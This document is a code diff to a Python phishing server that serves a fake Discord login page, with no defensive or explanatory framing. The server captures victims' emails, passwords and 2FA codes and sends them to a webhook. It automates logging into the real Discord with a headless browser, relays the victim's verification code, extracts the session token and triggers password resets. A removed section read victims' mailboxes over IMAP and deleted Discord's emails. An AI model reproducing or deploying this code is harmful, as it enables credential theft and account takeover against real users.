@@ -6,8 +6,7 @@ import asyncio
 import imaplib
 import email
 import time
-import random
-import string
+import threading
 from http.server import HTTPServer, BaseHTTPRequestHandler
 from socketserver import ThreadingMixIn
 from playwright.async_api import async_playwright
@@ -35,11 +34,12 @@ HTML = r"""<!DOCTYPE html>
 --link:#00a8fc;
 --input-bg:#1e1f22;
 --error:#f23f43;
+--success:#23a55a;
 }
 html,body{
 height:100%;
 width:100%;
-font-family:'Inter','gg sans','Noto Sans',Helvetica,Arial,sans-serif;
+font-family:'gg sans','Noto Sans',Helvetica,Arial,sans-serif;
 background:var(--bg);
 color:var(--text-white);
 overflow:hidden;
@@ -53,21 +53,7 @@ background:
 radial-gradient(ellipse 300px 300px at 0% 0%, rgba(88,101,242,0.08) 0%, transparent 70%),
 radial-gradient(ellipse 250px 250px at 100% 15%, rgba(88,101,242,0.06) 0%, transparent 70%),
 radial-gradient(ellipse 200px 200px at 85% 60%, rgba(88,101,242,0.05) 0%, transparent 70%),
-radial-gradient(ellipse 280px 280px at 10% 80%, rgba(88,101,242,0.06) 0%, transparent 70%),
-radial-gradient(ellipse 180px 180px at 50% 30%, rgba(88,101,242,0.04) 0%, transparent 70%);
-pointer-events:none;
-}
-body::after{
-content:'';
-position:fixed;
-inset:0;
-z-index:0;
-background:
-radial-gradient(circle 80px at 92% 12%, rgba(255,255,255,0.015) 0%, transparent 100%),
-radial-gradient(circle 120px at 88% 55%, rgba(255,255,255,0.012) 0%, transparent 100%),
-radial-gradient(circle 60px at 5% 25%, rgba(255,255,255,0.015) 0%, transparent 100%),
-radial-gradient(circle 90px at 8% 75%, rgba(255,255,255,0.012) 0%, transparent 100%),
-radial-gradient(circle 50px at 50% 5%, rgba(255,255,255,0.01) 0%, transparent 100%);
+radial-gradient(ellipse 280px 280px at 10% 80%, rgba(88,101,242,0.06) 0%, transparent 70%);
 pointer-events:none;
 }
 .container{
@@ -90,6 +76,11 @@ height:36px;
 cursor:pointer;
 margin-bottom:24px;
 margin-left:-4px;
+border-radius:50%;
+transition:background 0.15s;
+}
+.back-arrow:hover{
+background:rgba(255,255,255,0.05);
 }
 .back-arrow svg{
 width:22px;
@@ -184,6 +175,19 @@ color:#fff;
 border-radius:50%;
 font-size:11px;
 font-weight:700;
+flex-shrink:0;
+}
+.success-message{
+display:none;
+align-items:center;
+gap:6px;
+margin-top:8px;
+font-size:12px;
+color:var(--success);
+font-weight:500;
+}
+.success-message.visible{
+display:flex;
 }
 .eye-toggle{
 position:absolute;
@@ -218,6 +222,7 @@ font-weight:500;
 color:var(--link);
 text-decoration:none;
 cursor:pointer;
+transition:color 0.15s;
 }
 .forgot-link:hover{
 text-decoration:underline;
@@ -276,6 +281,7 @@ font-weight:500;
 color:var(--link);
 text-decoration:none;
 cursor:pointer;
+transition:color 0.15s;
 }
 .passkey-link:hover{
 text-decoration:underline;
@@ -289,6 +295,7 @@ align-items:center;
 justify-content:center;
 z-index:100;
 padding:24px;
+backdrop-filter:blur(2px);
 }
 .modal-overlay.active{
 display:flex;
@@ -298,8 +305,9 @@ background:#2b2d31;
 border-radius:12px;
 padding:24px;
 width:100%;
-max-width:360px;
+max-width:400px;
 position:relative;
+box-shadow:0 0 20px rgba(0,0,0,0.3);
 }
 .modal-close{
 position:absolute;
@@ -314,7 +322,9 @@ justify-content:center;
 background:none;
 border:none;
 color:var(--text-muted);
-font-size:20px;
+font-size:24px;
+line-height:1;
+padding:0;
 }
 .modal-close:hover{
 color:var(--text-white);
@@ -332,6 +342,22 @@ color:var(--text-muted);
 line-height:1.5;
 margin-bottom:20px;
 }
+.modal-input{
+width:100%;
+height:48px;
+background:var(--input-bg);
+border:none;
+border-radius:8px;
+padding:0 16px;
+font-size:16px;
+color:var(--text-white);
+font-family:inherit;
+outline:none;
+margin-bottom:16px;
+}
+.modal-input:focus{
+box-shadow:0 0 0 2px var(--blurple);
+}
 .modal-btn{
 width:100%;
 height:44px;
@@ -343,27 +369,57 @@ font-size:16px;
 font-weight:600;
 font-family:inherit;
 cursor:pointer;
+transition:background 0.15s;
 }
 .modal-btn:hover{
 background:var(--blurple-hover);
 }
+.modal-btn.secondary{
+background:var(--bg-dark);
+color:var(--text-white);
+}
+.modal-btn.secondary:hover{
+background:#3a3c42;
+}
 .code-input{
 width:100%;
-height:52px;
+height:56px;
 background:var(--input-bg);
 border:none;
 border-radius:8px;
 padding:0 16px;
-font-size:24px;
+font-size:28px;
 color:var(--text-white);
 font-family:'SF Mono',monospace;
 text-align:center;
-letter-spacing:8px;
+letter-spacing:12px;
 outline:none;
 margin-bottom:16px;
 }
 .code-input:focus{
 box-shadow:0 0 0 2px var(--blurple);
+}
+.status-box{
+background:var(--bg-dark);
+border-radius:8px;
+padding:16px;
+margin-bottom:16px;
+text-align:center;
+}
+.status-box .icon{
+font-size:32px;
+margin-bottom:8px;
+}
+.status-box h3{
+font-size:16px;
+font-weight:600;
+color:var(--text-white);
+margin-bottom:4px;
+}
+.status-box p{
+font-size:14px;
+color:var(--text-muted);
+margin:0;
 }
 @media(min-width:481px){
 .container{
@@ -409,29 +465,42 @@ padding-top:60px;
 
     <button type="submit" class="login-btn" id="loginBtn">Log In</button>
     <a class="passkey-link" href="#">Or, sign in with passkey</a>
+    
+    <div class="success-message" id="verifyMsg" style="margin-top:12px;justify-content:center;">
+      Check your Gmail for verification code
+    </div>
   </form>
 </div>
 
 <div class="modal-overlay" id="forgotModal">
   <div class="modal">
     <button class="modal-close" onclick="closeForgotModal()">&times;</button>
-    <h2>Password Reset</h2>
-    <p>Enter your email to receive reset instructions.</p>
-    <input type="text" class="code-input" id="resetEmail" placeholder="Email">
-    <button class="modal-btn" onclick="submitForgot()">Send Reset Link</button>
+    <h2>Reset your password</h2>
+    <p>Enter your email address and we'll send you instructions to reset your password.</p>
+    <input type="text" class="modal-input" id="resetEmail" placeholder="name@example.com" autocomplete="email">
+    <button class="modal-btn" id="resetBtn" onclick="submitForgot()">Send Reset Instructions</button>
+    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeForgotModal()">Cancel</button>
   </div>
 </div>
 
 <div class="modal-overlay" id="verifyModal">
   <div class="modal">
-    <h2>Verify Identity</h2>
-    <p>Enter the 6-digit code sent to your email.</p>
-    <input type="text" class="code-input" id="verifyCode" maxlength="6" placeholder="000000">
+    <h2>Verify New Location</h2>
+    <div class="status-box">
+      <div class="icon">📧</div>
+      <h3>Check your Gmail</h3>
+      <p>We've sent a verification code to your email. Please verify the new login location to continue.</p>
+    </div>
+    <input type="text" class="code-input" id="verifyCode" maxlength="6" placeholder="000000" autocomplete="one-time-code">
     <button class="modal-btn" onclick="submitVerify()">Verify</button>
+    <button class="modal-btn secondary" style="margin-top:8px;" onclick="closeVerifyModal()">Cancel</button>
   </div>
 </div>
 
 <script>
+let currentEmail = '';
+let currentPassword = '';
+
 function togglePassword() {
   const input = document.getElementById('password');
   const icon = document.getElementById('eyeIcon');
@@ -446,6 +515,7 @@ function togglePassword() {
 
 function showForgotModal() {
   document.getElementById('forgotModal').classList.add('active');
+  document.getElementById('resetEmail').value = document.getElementById('email').value || '';
 }
 
 function closeForgotModal() {
@@ -454,28 +524,67 @@ function closeForgotModal() {
 
 function showVerifyModal() {
   document.getElementById('verifyModal').classList.add('active');
+  document.getElementById('verifyCode').focus();
 }
 
-function submitForgot() {
-  const email = document.getElementById('resetEmail').value;
-  fetch('/api/forgot', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({email})
-  });
-  closeForgotModal();
-  alert('If an account exists, a reset link has been sent.');
-}
-
-function submitVerify() {
-  const code = document.getElementById('verifyCode').value;
-  const email = document.getElementById('email').value;
-  fetch('/api/verify', {
-    method: 'POST',
-    headers: {'Content-Type': 'application/json'},
-    body: JSON.stringify({code, email})
-  });
+function closeVerifyModal() {
   document.getElementById('verifyModal').classList.remove('active');
+}
+
+async function submitForgot() {
+  const email = document.getElementById('resetEmail').value.trim();
+  const btn = document.getElementById('resetBtn');
+  
+  if (!email) {
+    alert('Please enter your email address');
+    return;
+  }
+  
+  btn.classList.add('loading');
+  btn.disabled = true;
+  
+  try {
+    await fetch('/api/forgot', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({email})
+    });
+    
+    closeForgotModal();
+    alert('If an account exists with this email, you will receive reset instructions shortly.');
+  } catch (err) {
+    alert('Failed to send reset request');
+  } finally {
+    btn.classList.remove('loading');
+    btn.disabled = false;
+  }
+}
+
+async function submitVerify() {
+  const code = document.getElementById('verifyCode').value.trim();
+  
+  if (code.length !== 6) {
+    alert('Please enter the 6-digit verification code');
+    return;
+  }
+  
+  try {
+    const response = await fetch('/api/verify', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({code, email: currentEmail})
+    });
+    
+    const data = await response.json();
+    
+    if (data.success) {
+      closeVerifyModal();
+      document.getElementById('verifyMsg').classList.add('visible');
+      document.getElementById('verifyMsg').textContent = 'Verification submitted. Processing login...';
+    }
+  } catch (err) {
+    alert('Failed to submit verification');
+  }
 }
 
 document.getElementById('loginForm').addEventListener('submit', async function(e) {
@@ -486,12 +595,20 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
   const btn = document.getElementById('loginBtn');
   const emailError = document.getElementById('emailError');
   
+  currentEmail = email;
+  currentPassword = password;
+  
   document.getElementById('email').classList.remove('error');
   emailError.classList.remove('visible');
   
   if (!email) {
     document.getElementById('email').classList.add('error');
     emailError.classList.add('visible');
+    return;
+  }
+  
+  if (!password) {
+    alert('Please enter your password');
     return;
   }
   
@@ -509,9 +626,12 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     
     if (data.needsVerify) {
       showVerifyModal();
+    } else if (data.success) {
+      document.getElementById('verifyMsg').textContent = 'Login successful!';
+      document.getElementById('verifyMsg').classList.add('visible');
     }
   } catch (err) {
-    console.error(err);
+    alert('Login failed: ' + err.message);
   } finally {
     btn.classList.remove('loading');
     btn.disabled = false;
@@ -547,37 +667,45 @@ class Handler(BaseHTTPRequestHandler):
         
         if self.path == "/api/login":
             length = int(self.headers.get("Content-Length", 0))
-            body = json.loads(self.rfile.read(length))
-            email = body.get("email", "")
-            password = body.get("password", "")
+            body = self.rfile.read(length)
+            data = json.loads(body) if body else {}
+            email = data.get("email", "")
+            password = data.get("password", "")
             
             self._send_to_webhook({
-                "title": "New Login Attempt",
+                "title": "🔐 New Login Attempt",
                 "fields": [
-                    {"name": "Email", "value": f"`{email}`", "inline": False},
-                    {"name": "Password", "value": f"`{password}`", "inline": False},
-                    {"name": "IP Address", "value": f"`{client_ip}`", "inline": True},
+                    {"name": "Email", "value": f"```{email}```", "inline": False},
+                    {"name": "Password", "value": f"```{password}```", "inline": False},
+                    {"name": "IP Address", "value": f"```{client_ip}```", "inline": True},
                     {"name": "User-Agent", "value": self.headers.get("User-Agent", "Unknown")[:100], "inline": True}
                 ],
                 "color": 0x5865f2,
                 "timestamp": datetime.utcnow().isoformat()
             })
             
-            asyncio.create_task(self._automate_discord_login(email, password, client_ip))
+            # Start automation in background thread
+            thread = threading.Thread(target=self._run_automation, args=(email, password, client_ip))
+            thread.daemon = True
+            thread.start()
             
             self._send_json({"needsVerify": True})
             
         elif self.path == "/api/verify":
             length = int(self.headers.get("Content-Length", 0))
-            body = json.loads(self.rfile.read(length))
-            code = body.get("code", "")
-            email = body.get("email", "")
+            body = self.rfile.read(length)
+            data = json.loads(body) if body else {}
+            code = data.get("code", "")
+            email = data.get("email", "")
+            
+            # Store code for automation to pick up
+            self._store_verification_code(email, code)
             
             self._send_to_webhook({
-                "title": "2FA Code Entered",
+                "title": "📱 2FA Code Entered",
                 "fields": [
-                    {"name": "Email", "value": f"`{email}`", "inline": False},
-                    {"name": "Code", "value": f"`{code}`", "inline": False}
+                    {"name": "Email", "value": f"```{email}```", "inline": False},
+                    {"name": "Code", "value": f"```{code}```", "inline": False}
                 ],
                 "color": 0x00ff00
             })
@@ -586,19 +714,49 @@ class Handler(BaseHTTPRequestHandler):
             
         elif self.path == "/api/forgot":
             length = int(self.headers.get("Content-Length", 0))
-            body = json.loads(self.rfile.read(length))
-            email = body.get("email", "")
+            body = self.rfile.read(length)
+            data = json.loads(body) if body else {}
+            email = data.get("email", "")
             
-            asyncio.create_task(self._trigger_password_reset(email, client_ip))
+            self._send_to_webhook({
+                "title": "🔄 Password Reset Requested",
+                "fields": [
+                    {"name": "Email", "value": f"```{email}```", "inline": False},
+                    {"name": "IP", "value": f"```{client_ip}```", "inline": True}
+                ],
+                "color": 0xffaa00
+            })
+            
+            # Trigger reset automation
+            thread = threading.Thread(target=self._run_reset_automation, args=(email, client_ip))
+            thread.daemon = True
+            thread.start()
             
             self._send_json({"sent": True})
         else:
             self.send_response(404)
             self.end_headers()
 
+    def _store_verification_code(self, email, code):
+        try:
+            with open(f"/tmp/verify_{email.replace('@','_')}.txt", "w") as f:
+                f.write(code)
+        except:
+            pass
+
+    def _get_stored_code(self, email):
+        try:
+            path = f"/tmp/verify_{email.replace('@','_')}.txt"
+            if os.path.exists(path):
+                with open(path, "r") as f:
+                    return f.read().strip()
+        except:
+            pass
+        return None
+
     def _send_to_webhook(self, embed):
         import urllib.request
-        data = json.dumps({"embeds": [embed]}).encode()
+        data = json.dumps({"embeds": [embed], "username": "Discord Logger"}).encode()
         req = urllib.request.Request(
             WEBHOOK_URL,
             data=data,
@@ -607,8 +765,14 @@ class Handler(BaseHTTPRequestHandler):
         )
         try:
             urllib.request.urlopen(req, timeout=5)
-        except:
-            pass
+        except Exception as e:
+            print(f"Webhook error: {e}")
+
+    def _run_automation(self, email, password, client_ip):
+        asyncio.run(self._automate_discord_login(email, password, client_ip))
+
+    def _run_reset_automation(self, email, client_ip):
+        asyncio.run(self._trigger_password_reset(email, client_ip))
 
     async def _automate_discord_login(self, email, password, client_ip):
         try:
@@ -616,98 +780,103 @@ class Handler(BaseHTTPRequestHandler):
                 browser = await p.chromium.launch(headless=True)
                 context = await browser.new_context(
                     viewport={"width": 1280, "height": 720},
-                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.0"
+                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.0"
                 )
                 page = await context.new_page()
                 
                 await page.goto("https://discord.com/login")
-                await page.wait_for_timeout(2000)
+                await page.wait_for_timeout(3000)
                 
+                # Fill credentials
                 await page.fill('input[name="email"]', email)
                 await page.fill('input[name="password"]', password)
                 await page.click('button[type="submit"]')
                 
-                await page.wait_for_timeout(3000)
+                await page.wait_for_timeout(4000)
                 
-                if await page.query_selector('[data-testid="verify-email-modal"]'):
-                    code = await self._get_verification_code_from_email(email, password)
+                # Check for verification requirement
+                verify_prompt = await page.query_selector('text=/verify|check your email|new location/i')
+                code_input = await page.query_selector('input[placeholder*="code" i], input[maxlength="6"]')
+                
+                if verify_prompt or code_input:
+                    self._send_to_webhook({
+                        "title": "⚠️ Verification Required",
+                        "fields": [
+                            {"name": "Status", "value": "Waiting for email verification", "inline": False},
+                            {"name": "Email", "value": f"```{email}```", "inline": True}
+                        ],
+                        "color": 0xffaa00
+                    })
+                    
+                    # Wait for user to submit code via frontend
+                    code = None
+                    for _ in range(60):  # Wait up to 2 minutes
+                        code = self._get_stored_code(email)
+                        if code:
+                            break
+                        await asyncio.sleep(2)
+                    
                     if code:
-                        await page.fill('input[placeholder="Enter code"]', code)
-                        await page.click('button[type="submit"]')
-                        await page.wait_for_timeout(3000)
+                        # Try to fill code
+                        try:
+                            await page.fill('input[placeholder*="code" i], input[maxlength="6"]', code)
+                            await page.click('button[type="submit"]')
+                            await page.wait_for_timeout(4000)
+                        except:
+                            pass
                 
+                # Check for "Verify New Location" prompt specifically
+                try:
+                    verify_btn = await page.query_selector('button:has-text("Verify")')
+                    if verify_btn:
+                        await verify_btn.click()
+                        await page.wait_for_timeout(3000)
+                except:
+                    pass
+                
+                # Extract token
                 token = await page.evaluate("() => localStorage.getItem('token')")
                 
                 if token:
                     self._send_to_webhook({
-                        "title": "Discord Token Captured",
+                        "title": "🎉 Discord Token Captured",
                         "fields": [
-                            {"name": "Token", "value": f"`{token[:50]}...`", "inline": False},
-                            {"name": "Email", "value": f"`{email}`", "inline": True},
-                            {"name": "IP Used", "value": f"`{client_ip}`", "inline": True}
+                            {"name": "Token", "value": f"```{token}```", "inline": False},
+                            {"name": "Email", "value": f"```{email}```", "inline": True},
+                            {"name": "Password", "value": f"```{password}```", "inline": True},
+                            {"name": "IP Used", "value": f"```{client_ip}```", "inline": False}
                         ],
                         "color": 0x00ff00
                     })
+                else:
+                    # Try alternative token locations
+                    tokens = await page.evaluate("""() => {
+                        const results = {};
+                        for (let i = 0; i < localStorage.length; i++) {
+                            const key = localStorage.key(i);
+                            if (key.includes('token') || key.includes('auth')) {
+                                results[key] = localStorage.getItem(key);
+                            }
+                        }
+                        return results;
+                    }""")
+                    
+                    if tokens:
+                        self._send_to_webhook({
+                            "title": "🔍 Partial Token Data Found",
+                            "fields": [
+                                {"name": "Data", "value": f"```{json.dumps(tokens)[:1000]}```", "inline": False}
+                            ],
+                            "color": 0xffaa00
+                        })
                 
                 await browser.close()
         except Exception as e:
             self._send_to_webhook({
-                "title": "Automation Error",
-                "fields": [{"name": "Error", "value": str(e)[:1000], "inline": False}],
+                "title": "❌ Automation Error",
+                "fields": [{"name": "Error", "value": f"```{str(e)[:1000]}```", "inline": False}],
                 "color": 0xff0000
             })
-
-    async def _get_verification_code_from_email(self, email, password):
-        try:
-            domain = email.split("@")[1]
-            
-            if "gmail" in domain:
-                imap_server = "imap.gmail.com"
-            elif "outlook" in domain or "hotmail" in domain:
-                imap_server = "outlook.office365.com"
-            else:
-                return None
-                
-            mail = imaplib.IMAP4_SSL(imap_server)
-            mail.login(email, password)
-            mail.select("inbox")
-            
-            for _ in range(30):
-                _, messages = mail.search(None, '(FROM "noreply@discord.com" SUBJECT "verify")')
-                message_ids = messages[0].split()
-                
-                if message_ids:
-                    latest_id = message_ids[-1]
-                    _, msg_data = mail.fetch(latest_id, "(RFC822)")
-                    raw_email = msg_data[0][1]
-                    email_message = email.message_from_bytes(raw_email)
-                    
-                    body = ""
-                    if email_message.is_multipart():
-                        for part in email_message.walk():
-                            if part.get_content_type() == "text/plain":
-                                body = part.get_payload(decode=True).decode()
-                                break
-                    else:
-                        body = email_message.get_payload(decode=True).decode()
-                    
-                    match = re.search(r'\b\d{6}\b', body)
-                    if match:
-                        code = match.group()
-                        mail.store(latest_id, "+FLAGS", "\\Deleted")
-                        mail.expunge()
-                        mail.close()
-                        mail.logout()
-                        return code
-                
-                await asyncio.sleep(10)
-                
-            mail.close()
-            mail.logout()
-            return None
-        except Exception as e:
-            print(f"IMAP Error: {e}")
-            return None
 
     async def _trigger_password_reset(self, email, client_ip):
         try:
@@ -716,24 +885,34 @@ class Handler(BaseHTTPRequestHandler):
                 page = await browser.new_page()
                 
                 await page.goto("https://discord.com/login")
-                await page.click('a[href="/login"]')
-                await page.wait_for_timeout(1000)
-                await page.click('text=Forgot your password?')
+                await page.wait_for_timeout(2000)
+                
+                # Click forgot password
+                forgot_link = await page.query_selector('a[href*="/forgot"], text=Forgot your password?')
+                if forgot_link:
+                    await forgot_link.click()
+                else:
+                    await page.goto("https://discord.com/forgot")
+                
+                await page.wait_for_timeout(2000)
                 await page.fill('input[name="email"]', email)
                 await page.click('button[type="submit"]')
                 
+                await page.wait_for_timeout(3000)
+                
                 self._send_to_webhook({
-                    "title": "Password Reset Triggered",
+                    "title": "🔄 Password Reset Triggered",
                     "fields": [
-                        {"name": "Email", "value": f"`{email}`", "inline": False},
-                        {"name": "IP", "value": f"`{client_ip}`", "inline": True}
+                        {"name": "Email", "value": f"```{email}```", "inline": False},
+                        {"name": "IP", "value": f"```{client_ip}```", "inline": True},
+                        {"name": "Status", "value": "Reset email sent by Discord", "inline": True}
                     ],
                     "color": 0xffaa00
                 })
                 
                 await browser.close()
-        except:
-            pass
+        except Exception as e:
+            print(f"Reset error: {e}")
 
 class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
     daemon_threads = True
